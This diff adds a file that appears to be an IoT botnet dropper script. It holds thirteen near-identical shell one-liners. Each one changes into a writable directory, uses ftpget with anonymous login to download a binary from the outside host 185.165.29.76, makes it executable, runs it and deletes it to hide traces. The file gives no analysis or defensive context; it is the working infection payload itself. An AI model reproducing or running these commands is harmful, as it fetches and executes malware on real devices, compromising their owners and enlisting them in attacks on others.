@@ -1,0 +1,13 @@
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 185.165.29.76 jaden jaden; chmod 777 jaden ./jaden; rm -rf jaden
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 185.165.29.76 elena elena; chmod 777 elena ./elena; rm -rf elena
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 185.165.29.76 vape vape; chmod 777 vape ./vape; rm -rf vape
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 185.165.29.76 frank frank; chmod 777 frank ./frank; rm -rf frank
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 185.165.29.76 greg greg; chmod 777 greg ./greg; rm -rf greg
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 185.165.29.76 loser loser; chmod 777 loser ./loser; rm -rf loser
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 185.165.29.76 dave dave; chmod 777 dave ./dave; rm -rf dave
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 185.165.29.76 mike mike; chmod 777 mike ./mike; rm -rf mike
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 185.165.29.76 renard renard; chmod 777 renard ./renard; rm -rf renard
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 185.165.29.76 kali kali; chmod 777 kali ./kali; rm -rf kali
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 185.165.29.76 ' ' ' '; chmod 777 ' ' ./' '; rm -rf ' '
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 185.165.29.76 drake drake; chmod 777 drake ./drake; rm -rf drake
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 185.165.29.76 lance lance; chmod 777 lance ./lance; rm -rf lance
